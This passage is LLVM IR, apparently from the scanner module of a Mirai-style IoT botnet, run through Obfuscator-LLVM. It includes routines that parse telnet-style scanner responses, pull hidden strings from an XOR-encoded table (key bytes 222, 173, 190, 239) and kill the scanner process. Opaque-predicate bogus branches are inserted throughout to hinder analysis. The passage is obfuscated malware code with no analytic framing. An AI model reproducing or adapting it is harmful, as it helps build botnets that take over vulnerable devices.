  %119 = load i8, i8* %118, align 1
  %120 = zext i8 %119 to i32
  %121 = call i32 (i8*, i8*, ...) @szprintf(i8* %110, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.130, i32 0, i32 0), i32 %120)
  %122 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  %123 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i32 0, i32 0
  %124 = call i8* @strcat(i8* %122, i8* %123) #7
  br label %125

; <label>:125:                                    ; preds = %108
  %126 = load i32, i32* %3, align 4
  %127 = add nsw i32 %126, 1
  store i32 %127, i32* %3, align 4
  br label %88

; <label>:128:                                    ; preds = %107, %88
  %129 = load i32, i32* @x.41
  %130 = load i32, i32* @y.42
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %128
  %137 = load i32, i32* %7, align 4
  %138 = load %struct.payload*, %struct.payload** %2, align 8
  %139 = getelementptr inbounds %struct.payload, %struct.payload* %138, i32 0, i32 3
  %140 = load i16, i16* %139, align 8
  %141 = zext i16 %140 to i32
  %142 = sdiv i32 %141, 64
  %143 = add nsw i32 %142, 1
  %144 = icmp eq i32 %137, %143
  %145 = load i32, i32* @x.41
  %146 = load i32, i32* @y.42
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBBpart253, label %originalBB25alteredBB

originalBBpart253:                                ; preds = %originalBB25
  br i1 %144, label %153, label %155

; <label>:153:                                    ; preds = %originalBBpart253
  %154 = load %struct.binary*, %struct.binary** %5, align 8
  ret %struct.binary* %154

; <label>:155:                                    ; preds = %originalBBpart253
  %156 = load i32, i32* @x.41
  %157 = load i32, i32* @y.42
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %155
  %164 = load %struct.binary*, %struct.binary** %5, align 8
  %165 = load i32, i32* %7, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.binary, %struct.binary* %164, i64 %166
  %168 = getelementptr inbounds %struct.binary, %struct.binary* %167, i32 0, i32 0
  %169 = load i8*, i8** %168, align 8
  %170 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  %171 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  %172 = call i32 @util_strlen(i8* %171)
  %173 = sext i32 %172 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %169, i8* %170, i64 %173, i32 1, i1 false)
  %174 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %174, i8 0, i64 256, i32 16, i1 false)
  %175 = load i32, i32* %7, align 4
  %176 = trunc i32 %175 to i8
  %177 = load %struct.binary*, %struct.binary** %5, align 8
  %178 = getelementptr inbounds %struct.binary, %struct.binary* %177, i32 0, i32 1
  store i8 %176, i8* %178, align 8
  %179 = load i32, i32* %7, align 4
  %180 = add nsw i32 %179, 1
  store i32 %180, i32* %7, align 4
  %181 = load i32, i32* %3, align 4
  %182 = load i32, i32* %4, align 4
  %183 = add nsw i32 %182, %181
  store i32 %183, i32* %4, align 4
  %184 = load i32, i32* @x.41
  %185 = load i32, i32* @y.42
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart260, label %originalBB55alteredBB

originalBBpart260:                                ; preds = %originalBB55
  br label %71

originalBBalteredBB:                              ; preds = %originalBB, %19
  %192 = load i32, i32* %3, align 4
  %193 = load %struct.payload*, %struct.payload** %2, align 8
  %194 = getelementptr inbounds %struct.payload, %struct.payload* %193, i32 0, i32 3
  %195 = load i16, i16* %194, align 8
  %196 = zext i16 %195 to i32
  %_ = shl i32 %196, 64
  %197 = sdiv i32 %196, 64
  %_1 = sub i32 0, %197
  %gen = add i32 %_1, 1
  %198 = add nsw i32 %197, 1
  %199 = icmp slt i32 %192, %198
  br label %originalBB

originalBB2alteredBB:                             ; preds = %originalBB2, %51
  %200 = load i32, i32* %3, align 4
  %_3 = shl i32 %200, 1
  %_4 = sub i32 0, %200
  %gen5 = add i32 %_4, 1
  %_6 = sub i32 0, %200
  %gen7 = add i32 %_6, 1
  %_8 = sub i32 0, %200
  %gen9 = add i32 %_8, 1
  %_10 = sub i32 0, %200
  %gen11 = add i32 %_10, 1
  %_12 = sub i32 0, %200
  %gen13 = add i32 %_12, 1
  %_14 = sub i32 %200, 1
  %gen15 = mul i32 %_14, 1
  %_16 = sub i32 %200, 1
  %gen17 = mul i32 %_16, 1
  %201 = add nsw i32 %200, 1
  store i32 %201, i32* %3, align 4
  br label %originalBB2

originalBB21alteredBB:                            ; preds = %originalBB21, %71
  store i32 0, i32* %3, align 4
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %128
  %202 = load i32, i32* %7, align 4
  %203 = load %struct.payload*, %struct.payload** %2, align 8
  %204 = getelementptr inbounds %struct.payload, %struct.payload* %203, i32 0, i32 3
  %205 = load i16, i16* %204, align 8
  %206 = zext i16 %205 to i32
  %_26 = sub i32 0, %206
  %gen27 = add i32 %_26, 64
  %_28 = sub i32 0, %206
  %gen29 = add i32 %_28, 64
  %_30 = sub i32 %206, 64
  %gen31 = mul i32 %_30, 64
  %_32 = sub i32 0, %206
  %gen33 = add i32 %_32, 64
  %_34 = shl i32 %206, 64
  %207 = sdiv i32 %206, 64
  %_35 = sub i32 %207, 1
  %gen36 = mul i32 %_35, 1
  %_37 = sub i32 %207, 1
  %gen38 = mul i32 %_37, 1
  %_39 = shl i32 %207, 1
  %_40 = sub i32 %207, 1
  %gen41 = mul i32 %_40, 1
  %_42 = sub i32 %207, 1
  %gen43 = mul i32 %_42, 1
  %_44 = sub i32 %207, 1
  %gen45 = mul i32 %_44, 1
  %_46 = sub i32 0, %207
  %gen47 = add i32 %_46, 1
  %_48 = sub i32 %207, 1
  %gen49 = mul i32 %_48, 1
  %_50 = sub i32 %207, 1
  %gen51 = mul i32 %_50, 1
  %208 = add nsw i32 %207, 1
  %209 = icmp eq i32 %202, %208
  br label %originalBB25

originalBB55alteredBB:                            ; preds = %originalBB55, %155
  %210 = load %struct.binary*, %struct.binary** %5, align 8
  %211 = load i32, i32* %7, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.binary, %struct.binary* %210, i64 %212
  %214 = getelementptr inbounds %struct.binary, %struct.binary* %213, i32 0, i32 0
  %215 = load i8*, i8** %214, align 8
  %216 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  %217 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  %218 = call i32 @util_strlen(i8* %217)
  %219 = sext i32 %218 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %215, i8* %216, i64 %219, i32 1, i1 false)
  %220 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %220, i8 0, i64 256, i32 16, i1 false)
  %221 = load i32, i32* %7, align 4
  %222 = trunc i32 %221 to i8
  %223 = load %struct.binary*, %struct.binary** %5, align 8
  %224 = getelementptr inbounds %struct.binary, %struct.binary* %223, i32 0, i32 1
  store i8 %222, i8* %224, align 8
  %225 = load i32, i32* %7, align 4
  %_56 = sub i32 0, %225
  %gen57 = add i32 %_56, 1
  %226 = add nsw i32 %225, 1
  store i32 %226, i32* %7, align 4
  %227 = load i32, i32* %3, align 4
  %228 = load i32, i32* %4, align 4
  %_58 = shl i32 %228, %227
  %229 = add nsw i32 %228, %227
  store i32 %229, i32* %4, align 4
  br label %originalBB55
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_method_resonse(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  %7 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %7, i32 0, i32 7
  %9 = getelementptr inbounds [8192 x i8], [8192 x i8]* %8, i32 0, i32 0
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 4
  %12 = load i32, i32* %11, align 8
  %13 = call i32 @util_memsearch(i8* %9, i32 %12, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.150, i32 0, i32 0), i32 20)
  %14 = icmp ne i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 -2, i32* %2, align 4
  br label %76

; <label>:16:                                     ; preds = %1
  %17 = load i32, i32* @x.43
  %18 = load i32, i32* @y.44
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %26 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %25, i32 0, i32 7
  %27 = getelementptr inbounds [8192 x i8], [8192 x i8]* %26, i32 0, i32 0
  %28 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %29 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %28, i32 0, i32 4
  %30 = load i32, i32* %29, align 8
  %31 = call i32 @util_memsearch(i8* %27, i32 %30, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.151, i32 0, i32 0), i32 16)
  %32 = icmp ne i32 %31, -1
  %33 = load i32, i32* @x.43
  %34 = load i32, i32* @y.44
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %32, label %41, label %58

; <label>:41:                                     ; preds = %originalBBpart2
  %42 = load i32, i32* @x.43
  %43 = load i32, i32* @y.44
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %41
  store i32 -1, i32* %2, align 4
  %50 = load i32, i32* @x.43
  %51 = load i32, i32* @y.44
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %76

; <label>:58:                                     ; preds = %originalBBpart2
  br label %59

; <label>:59:                                     ; preds = %58
  call void @table_unlock_val(i8 zeroext 12)
  %60 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %60, i8** %4, align 8
  %61 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %62 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %61, i32 0, i32 7
  %63 = getelementptr inbounds [8192 x i8], [8192 x i8]* %62, i32 0, i32 0
  %64 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %65 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %64, i32 0, i32 4
  %66 = load i32, i32* %65, align 8
  %67 = load i8*, i8** %4, align 8
  %68 = load i32, i32* %6, align 4
  %69 = sub nsw i32 %68, 1
  %70 = call i32 @util_memsearch(i8* %63, i32 %66, i8* %67, i32 %69)
  store i32 %70, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 12)
  %71 = load i32, i32* %5, align 4
  %72 = icmp eq i32 %71, -1
  br i1 %72, label %73, label %74

; <label>:73:                                     ; preds = %59
  store i32 0, i32* %2, align 4
  br label %76

; <label>:74:                                     ; preds = %59
  %75 = load i32, i32* %5, align 4
  store i32 %75, i32* %2, align 4
  br label %76

; <label>:76:                                     ; preds = %74, %73, %originalBBpart24, %15
  %77 = load i32, i32* %2, align 4
  ret i32 %77

originalBBalteredBB:                              ; preds = %originalBB, %16
  %78 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %79 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %78, i32 0, i32 7
  %80 = getelementptr inbounds [8192 x i8], [8192 x i8]* %79, i32 0, i32 0
  %81 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %82 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %81, i32 0, i32 4
  %83 = load i32, i32* %82, align 8
  %84 = call i32 @util_memsearch(i8* %80, i32 %83, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.151, i32 0, i32 0), i32 16)
  %85 = icmp ne i32 %84, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %41
  store i32 -1, i32* %2, align 4
  br label %originalBB1
}

declare i32 @util_memsearch(i8*, i32, i8*, i32) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %6, i32 0, i32 0
  %8 = bitcast %struct.__va_list_tag* %7 to i8*
  call void @llvm.va_start(i8* %8)
  %9 = load i8*, i8** %4, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %6, i32 0, i32 0
  %12 = call i32 @vsprintf(i8* %9, i8* %10, %struct.__va_list_tag* %11) #7
  %13 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %6, i32 0, i32 0
  %14 = bitcast %struct.__va_list_tag* %13 to i8*
  call void @llvm.va_end(i8* %14)
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #1

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #7

; Function Attrs: nounwind
declare i32 @vsprintf(i8*, i8*, %struct.__va_list_tag*) #1

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #7

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = load i32, i32* @x.49
  %4 = load i32, i32* @y.50
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  store i8* %0, i8** %11, align 8
  store i32* %1, i32** %12, align 8
  %15 = load i8*, i8** %11, align 8
  %16 = call i32 @util_strlen(i8* %15)
  %17 = load i32*, i32** %12, align 8
  store i32 %16, i32* %17, align 4
  %18 = load i32*, i32** %12, align 8
  %19 = load i32, i32* %18, align 4
  %20 = add nsw i32 %19, 1
  %21 = sext i32 %20 to i64
  %22 = call noalias i8* @malloc(i64 %21) #7
  store i8* %22, i8** %14, align 8
  %23 = load i8*, i8** %14, align 8
  %24 = load i8*, i8** %11, align 8
  %25 = load i32*, i32** %12, align 8
  %26 = load i32, i32* %25, align 4
  %27 = add nsw i32 %26, 1
  call void @util_memcpy(i8* %23, i8* %24, i32 %27)
  store i32 0, i32* %13, align 4
  %28 = load i32, i32* @x.49
  %29 = load i32, i32* @y.50
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %36

; <label>:36:                                     ; preds = %originalBBpart228, %originalBBpart2
  %37 = load i32, i32* %13, align 4
  %38 = load i32*, i32** %12, align 8
  %39 = load i32, i32* %38, align 4
  %40 = icmp slt i32 %37, %39
  br i1 %40, label %41, label %93

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %14, align 8
  %43 = load i32, i32* %13, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = xor i32 %47, 222
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %45, align 1
  %50 = load i8*, i8** %14, align 8
  %51 = load i32, i32* %13, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = xor i32 %55, 173
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %53, align 1
  %58 = load i8*, i8** %14, align 8
  %59 = load i32, i32* %13, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %58, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = sext i8 %62 to i32
  %64 = xor i32 %63, 190
  %65 = trunc i32 %64 to i8
  store i8 %65, i8* %61, align 1
  %66 = load i8*, i8** %14, align 8
  %67 = load i32, i32* %13, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %66, i64 %68
  %70 = load i8, i8* %69, align 1
  %71 = sext i8 %70 to i32
  %72 = xor i32 %71, 239
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %69, align 1
  br label %74

; <label>:74:                                     ; preds = %41
  %75 = load i32, i32* @x.49
  %76 = load i32, i32* @y.50
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %74
  %83 = load i32, i32* %13, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %13, align 4
  %85 = load i32, i32* @x.49
  %86 = load i32, i32* @y.50
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart228, label %originalBB11alteredBB

originalBBpart228:                                ; preds = %originalBB11
  br label %36

; <label>:93:                                     ; preds = %36
  %94 = load i8*, i8** %14, align 8
  ret i8* %94

originalBBalteredBB:                              ; preds = %originalBB, %2
  %95 = alloca i8*, align 8
  %96 = alloca i32*, align 8
  %97 = alloca i32, align 4
  %98 = alloca i8*, align 8
  store i8* %0, i8** %95, align 8
  store i32* %1, i32** %96, align 8
  %99 = load i8*, i8** %95, align 8
  %100 = call i32 @util_strlen(i8* %99)
  %101 = load i32*, i32** %96, align 8
  store i32 %100, i32* %101, align 4
  %102 = load i32*, i32** %96, align 8
  %103 = load i32, i32* %102, align 4
  %_ = sub i32 %103, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 0, %103
  %gen2 = add i32 %_1, 1
  %_3 = shl i32 %103, 1
  %104 = add nsw i32 %103, 1
  %105 = sext i32 %104 to i64
  %106 = call noalias i8* @malloc(i64 %105) #7
  store i8* %106, i8** %98, align 8
  %107 = load i8*, i8** %98, align 8
  %108 = load i8*, i8** %95, align 8
  %109 = load i32*, i32** %96, align 8
  %110 = load i32, i32* %109, align 4
  %_4 = shl i32 %110, 1
  %_5 = sub i32 %110, 1
  %gen6 = mul i32 %_5, 1
  %_7 = sub i32 0, %110
  %gen8 = add i32 %_7, 1
  %_9 = sub i32 0, %110
  %gen10 = add i32 %_9, 1
  %111 = add nsw i32 %110, 1
  call void @util_memcpy(i8* %107, i8* %108, i32 %111)
  store i32 0, i32* %97, align 4
  br label %originalBB

originalBB11alteredBB:                            ; preds = %originalBB11, %74
  %112 = load i32, i32* %13, align 4
  %_12 = sub i32 %112, 1
  %gen13 = mul i32 %_12, 1
  %_14 = sub i32 %112, 1
  %gen15 = mul i32 %_14, 1
  %_16 = sub i32 0, %112
  %gen17 = add i32 %_16, 1
  %_18 = sub i32 %112, 1
  %gen19 = mul i32 %_18, 1
  %_20 = sub i32 %112, 1
  %gen21 = mul i32 %_20, 1
  %_22 = sub i32 0, %112
  %gen23 = add i32 %_22, 1
  %_24 = shl i32 %112, 1
  %_25 = sub i32 0, %112
  %gen26 = add i32 %_25, 1
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %13, align 4
  br label %originalBB11
}

declare void @util_memcpy(i8*, i8*, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @scanner_kill() #0 {
  %1 = load i32, i32* @scanner_pid, align 4
  %2 = call i32 @kill(i32 %1, i32 9) #7
  ret void
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { noreturn nounwind }
attributes #9 = { nounwind readnone }
attributes #10 = { nounwind readonly }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146781110}
!2 = !{i32 -2146780704}
!3 = !{i32 -2146590635}
!4 = !{i32 -2146590226}
